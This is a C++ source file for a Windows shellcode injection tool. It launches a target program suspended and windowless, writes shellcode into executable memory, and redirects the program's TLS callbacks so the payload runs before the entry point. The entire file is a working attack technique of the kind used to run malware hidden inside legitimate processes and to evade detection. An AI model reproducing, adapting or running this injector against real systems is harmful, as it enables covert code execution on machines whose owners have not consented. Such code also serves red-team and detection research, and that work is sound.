/**
* Injects shellcode into a process by overwriting TLS callbacks.
* This implementation starts the process in a suspended state so it can overwrite a TLS callback that is being executed instead of the entry point.
* Some TLS callbacks may be executed when a Thread is created or exits. Therefore it is also possible to use this technique on already running processes.
* Supports 32- and 64 Bit applications.
* [Requirements]
*	- the target process needs to make use of TLS callbacks
*/

#include <Windows.h>
#include <cstdio>
#include <vector>

#include "../payload/shellcode.hpp"
#include "../common/ntddk.h"



int main(int argc, char* argv[])
{
	if (argc != 2)
	{
		printf("Usage: *.exe applicationPath\n");
		return 1;
	}

	char* applicationPath = argv[1];

	STARTUPINFOA startupInfo = STARTUPINFOA();
	PROCESS_INFORMATION processInformation = PROCESS_INFORMATION();

	// create the process in a suspended state. We do this so we can overwrite a TLS callback that is executed instead of the entry point
	if (!CreateProcessA(0,
		applicationPath,
		0,
		0,
		0,
		CREATE_SUSPENDED | DETACHED_PROCESS | CREATE_NO_WINDOW,
		0,
		0,
		&startupInfo,
		&processInformation))
	{
		printf("[Error] %d - Failed to create process using application %s\n", GetLastError(), applicationPath);
		return 1;
	}

	printf("[Info] - Created target process in suspended state\n");

	// allocate memory in the target process
	LPVOID remoteMemory = VirtualAllocEx(processInformation.hProcess, nullptr, MAX_PATH, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);
	if (!remoteMemory)
	{
		printf("[Error] %d - Failed to allocate memory in target process\n", GetLastError());
		TerminateProcess(processInformation.hProcess, 1);
		return 1;
	}

	printf("[Info] - Allocated remote memory at %p\n", remoteMemory);

	// write shellcode into target process
	if (!WriteProcessMemory(processInformation.hProcess, remoteMemory, shellcode, sizeof(shellcode) - 1, NULL))
	{
		printf("[Error] %d - Failed to write .dll path to target process\n", GetLastError());
		TerminateProcess(processInformation.hProcess, 1);
		return 1;
	}

	printf("[Info] - Wrote payload to %p\n", remoteMemory);

	PROCESS_BASIC_INFORMATION processBasicInformation = {};
	ULONG returnLength = 0;
	// get process basic information
	NTSTATUS error = NtQueryInformationProcess(processInformation.hProcess, ProcessBasicInformation, &processBasicInformation, sizeof(PROCESS_BASIC_INFORMATION), &returnLength);
	if (error)
	{
		printf("[Error] %d - Failed to query process basic information\n", GetLastError());
		TerminateProcess(processInformation.hProcess, 1);
		return 1;
	}

	// read base address of process
	int64_t pebOffset = (int64_t)processBasicInformation.PebBaseAddress + 2 * sizeof(void*);
	LPVOID processBasesAddress = 0;
	if (!ReadProcessMemory(processInformation.hProcess, (LPCVOID)pebOffset, &processBasesAddress, sizeof(void*), NULL))
	{
		printf("[Error] %d - Failed to read PEB offset\n", GetLastError());
		TerminateProcess(processInformation.hProcess, 1);
		return 1;
	}

	// read PE headers
	const int PE_BUFFER_SIZE = 4096;
	int8_t peBuffer[PE_BUFFER_SIZE] = {};
	if (!ReadProcessMemory(processInformation.hProcess, processBasesAddress, peBuffer, PE_BUFFER_SIZE, NULL))
	{
		printf("[Error] %d - Failed to read PE header\n", GetLastError());
		TerminateProcess(processInformation.hProcess, 1);
		return 1;
	}

	printf("[Info] - Read PE header at %p\n", processBasesAddress);

	PIMAGE_DOS_HEADER dosHeader = (PIMAGE_DOS_HEADER)peBuffer;
	PIMAGE_NT_HEADERS ntHeader = (PIMAGE_NT_HEADERS)(peBuffer + dosHeader->e_lfanew);
	LPVOID entryPoint = (LPVOID)(ntHeader->OptionalHeader.AddressOfEntryPoint + (int64_t)processBasesAddress);

	IMAGE_DATA_DIRECTORY tlsEntryDataDirectory = ntHeader->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_TLS];

	if (tlsEntryDataDirectory.Size == 0)
	{
		printf("[Error] - The target application does not contain TLS callbacks\n");
		TerminateProcess(processInformation.hProcess, 1);
		return 1;
	}

	IMAGE_TLS_DIRECTORY tlsDirectory;
	ReadProcessMemory(processInformation.hProcess, (BYTE*)processBasesAddress + tlsEntryDataDirectory.VirtualAddress, &tlsDirectory, sizeof(IMAGE_TLS_DIRECTORY), nullptr);

	// this array is terminated by a nullpointer
	int tlsEntriesPatchedCount = 0;
	while (true)
	{
		PIMAGE_TLS_CALLBACK currentTlsCallback = nullptr;
		ReadProcessMemory(processInformation.hProcess, (DWORD_PTR*)tlsDirectory.AddressOfCallBacks + tlsEntriesPatchedCount, &currentTlsCallback, sizeof(IMAGE_TLS_DIRECTORY), nullptr);
		if (!currentTlsCallback)
		{
			break;
		}

		DWORD oldProtection;
		if (!VirtualProtectEx(processInformation.hProcess, (DWORD_PTR*)tlsDirectory.AddressOfCallBacks + tlsEntriesPatchedCount, sizeof(void*), PAGE_EXECUTE_READWRITE, &oldProtection))
		{
			printf("[Error] %d - Failed to change page protection of TLS callbacks\n", GetLastError());
		}

		if (!WriteProcessMemory(processInformation.hProcess, (DWORD_PTR*)tlsDirectory.AddressOfCallBacks + tlsEntriesPatchedCount, &remoteMemory, sizeof(void*), nullptr))
		{
			printf("[Error] %d - Failed to write tlscallback\n", GetLastError());
		}
		tlsEntriesPatchedCount++;
	}

	printf("[Info] - Overwrriten %d TLS callbacks\n", tlsEntriesPatchedCount);
	printf("[Info] - Resuming target process\n");

	if (!ResumeThread(processInformation.hThread))
	{
		printf("[Error] %d -  Failed ResumeThread\n", GetLastError());
		TerminateProcess(processInformation.hProcess, 1);
		return 1;
	}

	return 0;
}